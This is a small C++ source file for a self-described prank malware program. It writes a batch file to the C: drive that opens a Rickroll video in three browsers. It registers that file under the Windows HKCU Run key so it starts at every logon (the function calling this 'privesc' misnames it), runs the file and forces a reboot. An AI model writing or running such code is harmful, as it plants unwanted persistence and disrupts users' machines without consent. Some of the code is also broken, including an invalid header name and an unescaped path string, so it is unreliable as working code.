#include<iostream>
#include<windows.h>
#include<fstream>
#include <stdlib>

# define payload "@echo off & echo executing payload & start msedge https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO & start firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO & start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO"

using namespace std;

void runnpayload()
{
	fstream f("c:\\payload.bat", ios::out);
	f << payload;
	f.close();
	return;
}

void execpayload()
{
	system("C:\payload.bat");
	cout << "Malware Executed Successfully";
}

void logoff()

{
	system("shutdown /r");
}



void privesc()
{
	wstring path = L"C:\\payload.bat";
	HKEY regkey = NULL;
	LONG createkey = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &regkey);
	LONG ActivateKey = RegSetValueEx(regkey, L"Rickroll", 0, REG_SZ, (byte*)path.c_str(), (path.size() + 1) * sizeof(wchar_t));
}

int main()
{
	runnpayload();
	privesc();
	execpayload();
	logoff();
}